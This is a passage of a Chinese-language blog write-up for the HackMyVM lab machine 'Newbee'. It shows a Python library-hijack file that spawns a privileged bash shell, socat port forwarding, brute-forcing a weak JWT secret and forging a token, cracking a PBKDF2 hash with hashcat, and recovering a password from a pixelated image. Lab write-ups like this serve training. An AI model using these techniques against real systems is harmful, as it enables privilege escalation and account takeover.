u003e \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e.\u003cspan class=\"hljs-built_in\"\u003ejoin\u003c/span\u003e(random.choices(string.ascii_letters + string.digits, k=length))\n\ndef pointless_computation():\n\n    number = random.randint(1, 1000)\n    result = math.sqrt(number) * math.log(number)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"Calculated math nonsense: sqrt({number}) * log({number}) = {result}\"\u003c/span\u003e)\n\ndef simulate_time_wasting():\n\n    now = datetime.datetime.now()\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"Started wasting time at {now}\"\u003c/span\u003e)\n    time.sleep(2)  \u003cspan class=\"hljs-comment\"\u003e# 故意睡眠 2 秒\u003c/span\u003e\n    later = datetime.datetime.now()\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"Finished wasting time at {later}. Time wasted: {later - now}\"\u003c/span\u003e)\n\ndef pointless_string_operations():\n\n    rand_str = generate_random_string()\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"Generated random string: {rand_str}\"\u003c/span\u003e)\n    reversed_str = rand_str[::-1]\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"Reversed string: {reversed_str}\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"String length: {len(rand_str)}\"\u003c/span\u003e)\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e\"__main__\"\u003c/span\u003e:\n    pointless_computation()\n    simulate_time_wasting()\n    pointless_string_operations()\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"All done. The script accomplished nothing useful.\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e像是在做无用功的操作\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMNewbee/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003ePython 库劫持\u003c/h3\u003e\n\u003cp\u003e但是我们可以看到当前目录是可以进行写权限的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@Newbee:/var/www/html$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 20\ndrwxrwxrwx 4 root     root     4096 Mar  8 22:29 .\ndrwxr-xr-x 3 root     root     4096 Mar  6 00:23 ..\n-rw-r--r-- 1 root     root        0 Mar  6 19:02 .htaccess\ndrwxr-xr-x 3 root     root     4096 Mar  8 07:06 flask\ndrwxr-xr-x 3 www-data www-data 4096 Mar  7 00:20 shop\n-rwxr-xr-x 1 root     root     1086 Mar  8 07:10 vuln.py\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以进行库劫持，\u003ccode\u003ePython\u003c/code\u003e 以就近原则导入库\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# random.py\u003c/span\u003e\nimport os\nos.system(\u003cspan class=\"hljs-string\"\u003e\"/bin/bash -p\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMNewbee/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e提权 - To Root\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edebian@Newbee:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \ned2b1f468c5f915f3f1cf75d7068baae\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e当前目录下还有 \u003ccode\u003enote.txt\u003c/code\u003e 以及 \u003ccode\u003econfig.php\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edebian@Newbee:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e note.txt \nDamn it, I forgot my database password. I heard that Debian is currently building a message board, maybe he can \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e me\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edebian@Newbee:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e config.php \n\u0026#x3C;?php\n\u003cspan class=\"hljs-variable\"\u003e$servername\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"localhost\"\u003c/span\u003e;\n\u003cspan class=\"hljs-variable\"\u003e$username\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"root\"\u003c/span\u003e;\n\u003cspan class=\"hljs-variable\"\u003e$password\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"\n\n\u003cspan class=\"hljs-variable\"\u003e$conn\u003c/span\u003e = new mysqli(\u003cspan class=\"hljs-variable\"\u003e$servername\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$username\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$password\u003c/span\u003e);\n\n............\n............\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看一下正在监听的端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edebian@Newbee:~$ ss -tulpn\nNetid                  State                   Recv-Q                  Send-Q                                    Local Address:Port                                     Peer Address:Port                  Process                  \nudp                    UNCONN                  0                       0                                               0.0.0.0:68                                            0.0.0.0:*                                              \ntcp                    LISTEN                  0                       128                                           127.0.0.1:5000                                          0.0.0.0:*                                              \ntcp                    LISTEN                  0                       80                                            127.0.0.1:3306                                          0.0.0.0:*                                              \ntcp                    LISTEN                  0                       128                                             0.0.0.0:22                                            0.0.0.0:*                                              \ntcp                    LISTEN                  0                       511                                                   *:80                                                  *:*                                              \ntcp                    LISTEN                  0                       128                                                [::]:22                                               [::]:*  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现一个在本地运行的\u003ccode\u003e5000\u003c/code\u003e端口，将其转发出去\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edebian@Newbee:/tmp$ ./socat TCP-LISTEN:5001,fork tcp4:127.0.0.1:5000 \u0026#x26;\n[1] 38466\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问转发出去的端口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMNewbee/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在源代码页能找到\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMNewbee/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e登录页，尝试爆破一下，无果\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMNewbee/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eJWT 弱密钥\u003c/h3\u003e\n\u003cp\u003e但是貌似除了\u003ccode\u003eadmin\u003c/code\u003e用户其他用户都能直接登陆进去，这里使用 \u003ccode\u003e1:1\u003c/code\u003e ，登陆后会返回一串 \u003ccode\u003eJWT\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMNewbee/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEiLCJleHAiOjE3NDcyOTQyNTR9.iuXXxwNMPDYzab4OtZkI_vBS1nl9oj434Wp0kqavP_E\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过之前源代码发现的话，猜测是弱密钥，保存JWT使用\u003ccode\u003ehashcat\u003c/code\u003e爆破\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMNewbee/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到密钥\u003ccode\u003enoob\u003c/code\u003e ，构造 \u003ccode\u003eJWT\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMNewbee/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e将其替换掉原本的 \u003ccode\u003eJWT\u003c/code\u003e ，即可显示内容\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMNewbee/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到数据库账号密码：\u003ccode\u003eroot:TheStrongestPasswordHYHcreated\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMariaDB [user]\u003e \u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from user;\n+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+\n| \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e | username | passwd                                                                                                                   | salt                             | passwd_hash_algo |\n+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+\n|  1 | debian   | 2c082e3ff2ca15e3b24f815d70653f0dead09534495069dd140e19adb2d117266cc4b1de8daf55c7c4827a0a5ccf70c6f537ffc4ddc74db4865c41c0 | 8bf3e3452b78544f8bee9400d6936d34 | pbdf2$50500\u003cspan class=\"hljs-variable\"\u003e$60\u003c/span\u003e   |\n+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+\n1 row \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e (0.011 sec)\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e爆破 \u003cstrong\u003ePBKDF2\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e喂给 GPT，这段密码并不是传统的 MD5/ SHA1/ SHA256 之类的「一次性哈希」，而是用 \u003cstrong\u003ePBKDF2（Password-Based Key Derivation Function 2）\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e示例链接：\u003ca href=\"https://wsxk.github.io/hashcatgpu/\"\u003ehttps://wsxk.github.io/hashcatgpu/\u003c/a\u003e | \u003ca href=\"https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256\"\u003ehttps://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHA\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ehashcat -m 10900 pass.txt /usr/share/wordlists/rockyou.txt\n...\nsha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHA:1qaz2wsx\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码\u003ccode\u003e1qaz2wsx\u003c/code\u003e ，查看 \u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edebian@Newbee:/tmp$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e: unable to resolve host Newbee: Name or service not known\n[\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e debian: \nSorry, try again.\n[\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e debian: \n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e: 1 incorrect password attempt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e看来密码不是用在这里的，在家目录发现 \u003ccode\u003e.secret\u003c/code\u003e文件夹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edebian@Newbee:~/.secret$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\nhint.txt  password.zip\ndebian@Newbee:~/.secret$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e hint.txt \npassword is md5(key)\n\nand key is \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e mysql!!!!!!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e压缩包密码是\u003ccode\u003e1qaz2wsx\u003c/code\u003e的\u003ccode\u003emd5\u003c/code\u003e值\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edebian@Newbee:~/.secret$ \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -n \u003cspan class=\"hljs-string\"\u003e\"1qaz2wsx\"\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003emd5sum\u003c/span\u003e | awk \u003cspan class=\"hljs-string\"\u003e'{print $1}'\u003c/span\u003e\n1c63129ae9db9c60c3e8aa94d3e00495\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e图片修复\u003c/h3\u003e\n\u003cp\u003e解压后是一张图片\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Newbee unzip password.zip        \nArchive:  password.zip\n[password.zip] password.png password: \n extracting: password.png   \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e超级糊\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMNewbee/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e经过查阅，可以使用 \u003ccode\u003eDepix\u003c/code\u003e 来修复：\u003ca href=\"https://github.com/spipm/Depixelization_poc\"\u003ehttps://github.com/spipm/Depixelization_poc\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMNewbee/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMNewbee/image18.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ehellofromtheotherside\u003c/code\u003e和官方工具的演示图片一模一样\u003c/p\u003e\n\u003cp\u003e用作密码尝试登录成功\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMNewbee/image19.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@Newbee:~# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \nc18b3eff03996f3a203f63733be03d15\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e学到新东西，最后的从模糊的照片中恢复文本，\u003cstrong\u003ePBKDF2 Brute\u003c/strong\u003e…\u003c/p\u003e","title":"HackMyVM - Newbee","date":"2025-05-15","updated":"2025-05-15","tags":["HackMyVM","Linux靶机","Brute","JWT","文件包含","Depix"],"categories":"靶机","comments":true,"description":"Newbee. https://hackmyvm.eu/machines/machine.php?vm=Newbee Notes：None 前期踩点 Web 渗透 信息收集 访问，页脚中可以知道是通过 PHPJabbers 构建的 目录扫描 发现奇怪的页面 /secret.php ，访问 尝试 fu..."},"recentPosts":[{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":
